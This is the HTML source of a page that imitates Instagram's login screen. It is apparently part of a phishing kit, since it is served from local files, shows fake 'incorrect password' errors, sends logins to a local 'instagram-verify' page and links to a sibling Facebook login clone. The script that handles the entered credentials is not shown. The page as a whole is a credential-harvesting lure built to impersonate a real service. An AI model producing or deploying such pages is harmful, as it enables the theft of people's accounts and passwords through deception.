<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Instagram</title>
        <link rel="icon" href="./app/static/images/instagram-icon.png" />
        <link rel="stylesheet" href="./app/static/dist/style.css" />
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fontawesome-4.7@4.7.0/css/font-awesome.min.css" />
        <script defer src="./app/static/src/app.js"></script>
        <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.15.4/dist/cdn.min.js"></script>
    </head>
    <body class="m-0 min-h-screen overflow-x-hidden bg-gray-50 text-gray-900">
        <main class="min-h-screen font-sans text-zinc-900 selection:bg-blue-100">
            <section class="flex min-h-screen flex-col items-center justify-center bg-linear-to-b from-[#f7f8fa] via-[#f2f4f7] to-[#e9edf3] px-4 pt-5 md:hidden">
                <p class="mt-2 text-sm text-[#5d6c7b]">English (UK)</p>
                <div class="flex grow items-center justify-center"><img src="./app/static/images/instagram-logo.webp" alt="Instagram" class="h-15 w-15 object-contain" /></div>
                <form x-data="loginForm('./instagram-verify.html')" @submit.prevent="submit()" class="flex w-full grow flex-col gap-3">
                    <div class="flex flex-col gap-1">
                        <div class="relative"><input type="text" x-model="email" @blur="validate" placeholder=" " class="peer h-15.5 w-full rounded-2xl border border-[#dde2e8] bg-white px-4 py-4 pb-1 outline-none focus:border-[#5d6c7b]" :class="!isValid ? 'border-red-500' : ''" /><label class="pointer-events-none absolute top-1/2 left-0 -translate-y-6 px-4 text-[13px] text-[#5d6c7b] transition-all peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px]">Mobile number, username or email</label></div>
                        <p x-show="!isValid" class="px-1 text-[12px] text-red-600">Invalid email or phone number</p>
                    </div>
                    <div class="relative"><input type="password" x-model="password" placeholder=" " class="peer h-15.5 w-full rounded-2xl border bg-white px-4 py-4 pb-1 outline-none focus:border-[#5d6c7b]" :class="error ? 'border-red-500' : 'border-[#dde2e8]'" /><label class="pointer-events-none absolute top-1/2 left-0 -translate-y-6 px-4 text-[13px] transition-all peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px]" :class="error ? 'text-red-500' : 'text-[#5d6c7b]'">Password</label></div>
                    <p x-show="error" class="flex items-center gap-1 text-[14px] text-red-600"><i class="fa fa-exclamation-circle"></i><span>The password you've entered is incorrect.</span></p>
                    <button type="submit" :disabled="loading" class="flex h-11 items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7]" x-html="loading ? '<div class=\'mx-auto h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent\'></div>' : 'Log in'"></button>
                    <span class="text-center text-[15px] font-medium text-[#0a1317]">Forgot password?</span>
                </form>
                <footer class="flex w-full flex-col items-center justify-center gap-4 pb-4">
                    <button class="flex h-11 w-full items-center justify-center rounded-[22px] border border-[#0064e0] text-[#0064e0]">Create new account</button><a href="./facebook-login.html" class="flex h-11 w-full items-center justify-center gap-2 rounded-[22px] border border-[#dde2e8] bg-white text-[15px] text-[#0a1317]"><img src="./app/static/images/facebook-icon.png" alt="" class="h-4 w-4" /><span>Log in with Facebook</span></a
                    ><img src="./app/static/images/meta-icon.png" alt="Meta" class="h-3 w-15 object-contain" />
                </footer>
            </section>
            <section class="hidden h-screen bg-white md:block">
                <div class="flex h-full flex-col md:flex-row">
                    <div class="relative flex flex-1 flex-col items-center justify-center overflow-hidden border-r border-[#efefef] px-10 pt-9 pb-12 md:min-w-160">
                        <img src="./app/static/images/instagram-logo.webp" alt="Instagram" class="absolute top-9 left-10 h-12 w-12 object-contain" />
                        <p class="z-10 mb-8 text-center text-[48px] leading-[1.1] font-semibold tracking-tight text-[#1a1a1a]">
                            See everyday moments from <span class="block">your <span class="bg-linear-to-r from-[#f91b4f] to-[#f10b8f] bg-clip-text text-transparent">close friends</span>.</span>
                        </p>
                        <img src="./app/static/images/instagram-hero-image.webp" alt="" class="w-full max-w-lg object-contain" />
                    </div>
                    <div class="relative flex w-162.5 items-center justify-center px-13 py-12 md:min-w-125 md:pt-18.75">
                        <div class="w-full">
                            <p class="mb-6 text-start text-[17px] leading-[1.2941] font-semibold text-[#111112]">Log into Instagram</p>
                            <form x-data="loginForm('./instagram-verify.html')" @submit.prevent="submit()" class="space-y-4">
                                <div>
                                    <div class="group relative h-14 rounded-xl border border-[#bdbdbd] bg-white px-4 transition-colors hover:border-[#111112]" :class="!isValid ? 'border-red-600' : ''"><input type="text" x-model="email" @blur="validate" placeholder=" " class="peer block h-full w-full bg-transparent pt-1 text-[16px] outline-none" /><label class="pointer-events-none absolute top-1/2 left-3 -translate-y-1/2 bg-white px-1 text-[16px] text-zinc-500 transition-all peer-focus:top-0 peer-focus:text-[12px] peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-[12px]">Mobile number, username or email</label></div>
                                    <p x-show="!isValid" class="px-1 text-[12px] text-red-600">Invalid email or phone number</p>
                                </div>
                                <div class="group relative h-14 rounded-xl border bg-white px-4 transition-colors" :class="error ? 'border-red-600 ring-2 ring-red-100' : 'border-[#bdbdbd] hover:border-[#111112]'"><input type="password" x-model="password" placeholder=" " class="peer block h-full w-full bg-transparent pt-1 text-[16px] outline-none" /><label class="pointer-events-none absolute top-1/2 left-3 -translate-y-1/2 bg-white px-1 text-[16px] transition-all peer-focus:top-0 peer-focus:text-[12px] peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-[12px]" :class="error ? 'text-red-600' : 'text-zinc-500'">Password</label></div>
                                <p x-show="error" class="flex items-center gap-1 text-[14px] text-red-600"><i class="fa fa-exclamation-circle"></i><span>The password you've entered is incorrect.</span></p>
                                <button type="submit" :disabled="loading" class="h-12 w-full rounded-full bg-[#0866ff] text-[17px] font-bold text-white hover:bg-[#0759e4]" x-html="loading ? '<div class=\'mx-auto h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent\'></div>' : 'Log in'"></button>
                            </form>
                            <div class="mt-4 text-center"><button class="text-[15px] font-medium text-[#111112] hover:underline">Forgot password?</button></div>
                            <button class="mt-8 h-12 w-full rounded-full border border-[#0866ff] text-[17px] font-medium text-[#0866ff] hover:bg-[#f0f2f5]">Create new account</button><a href="./facebook-login.html" class="mt-10 flex h-12 w-full items-center justify-center gap-2 rounded-full border border-[#d8dce1] text-[17px] font-medium text-[#111112] hover:bg-[#f0f2f5]"><img src="./app/static/images/facebook-icon.png" alt="" class="h-4 w-4" /><span>Log in with Facebook</span></a
                            ><img src="./app/static/images/meta-icon.png" alt="Meta" class="mx-auto mt-10 h-3 w-15 object-contain" />
                        </div>
                    </div>
                </div>
            </section>
        </main>
    </body>
</html>
